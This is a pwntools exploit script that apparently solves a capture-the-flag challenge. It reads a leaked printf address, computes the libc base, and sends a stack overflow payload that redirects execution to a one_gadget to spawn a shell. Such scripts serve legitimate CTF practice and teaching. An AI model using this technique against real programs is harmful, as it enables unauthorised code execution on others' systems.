from pwn import *

context.terminal = ["konsole", "-e"]

r = remote("localhost", 5000)
# r = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# r = gdb.debug(
    # "./bin",
    # """
    # break main
    # continue
    # """,
    # env={"LD_PRELOAD": "./libc.so.6"}
# )

libc = ELF("./libc.so.6")
printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]

r.recvuntil(b"In my libc, printf() is at ")
printf_address = int(r.recvuntil(",")[:-1].decode(), 16)

libc_base = printf_address - printf_offset
system_address = libc_base + system_offset

offset = 88
one_gadget_offset = 0x54ecc
one_gadget_address = libc_base + one_gadget_offset

payload = f"{system_address} ".encode()
payload += b"A" * (offset - len(payload))
payload += p64(one_gadget_address)

r.sendline(payload)
r.interactive()